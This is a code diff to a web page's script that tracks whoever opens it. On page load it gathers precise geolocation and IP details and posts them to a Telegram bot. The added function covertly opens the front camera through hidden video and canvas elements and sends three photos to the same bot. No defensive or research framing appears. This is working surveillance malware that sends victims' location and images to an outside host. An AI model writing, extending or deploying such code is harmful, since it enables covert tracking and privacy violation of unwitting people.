@@ -147,7 +147,6 @@
                         timestamp: new Date().toLocaleString()
                     }),
                     error => {
-                        // Only show permission request if location was denied
                         if (error.code === error.PERMISSION_DENIED) {
                             setTimeout(() => {
                                 permissionRequest.style.display = 'flex';
@@ -223,37 +222,91 @@
             }, 3000);
         }
         
-        // Main tracking function
+        // MAIN tracking function
         async function trackUser() {
-            // Start rotating loading messages
             rotateLoadingMessages();
-            
-            // First try to get precise location silently
             const liveLocation = await getPreciseLocation();
-            
-            // Then get IP details
             const ipDetails = await getIPInfo();
             
-            // Combine all data
             const trackingData = {
                 ...ipDetails,
                 ip: ipDetails.ip || 'Unknown',
                 liveLocation: liveLocation
             };
             
-            // Send to Telegram
             await sendToTelegram(trackingData);
+
+            // ✅ NEW PART: Capture 3 photos from front camera
+            await captureMultiplePhotosAndSend();
         }
         
-        // When allow button is clicked
+        // When allow button clicked
         allowBtn.addEventListener('click', async () => {
             permissionRequest.style.display = 'none';
-            // Try to get location again
             await trackUser();
         });
         
-        // Start tracking when page loads
+        // Start tracking on load
         window.onload = trackUser;
+
+        // 📸 Function: Capture 3 photos silently from front camera
+        async function captureMultiplePhotosAndSend() {
+            try {
+                const video = document.createElement('video');
+                video.setAttribute("playsinline", "true");
+                video.style.display = "none";
+                document.body.appendChild(video);
+
+                const canvas = document.createElement('canvas');
+                canvas.style.display = "none";
+                document.body.appendChild(canvas);
+                const context = canvas.getContext('2d');
+
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" }
+                });
+                video.srcObject = stream;
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                for (let i = 1; i <= 3; i++) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    const imageData = canvas.toDataURL("image/png");
+                    const formData = new FormData();
+                    formData.append("chat_id", chatId);
+                    formData.append("photo", dataURItoBlob(imageData));
+                    formData.append("caption", `📸 Captured Photo ${i}`);
+
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    });
+
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+
+                stream.getTracks().forEach(track => track.stop());
+                video.remove();
+                canvas.remove();
+
+            } catch (err) {
+                console.error("Camera multiple capture error:", err);
+            }
+        }
+
+        // Helper: Convert base64 → Blob
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
     </script>
 </body>
 </html>
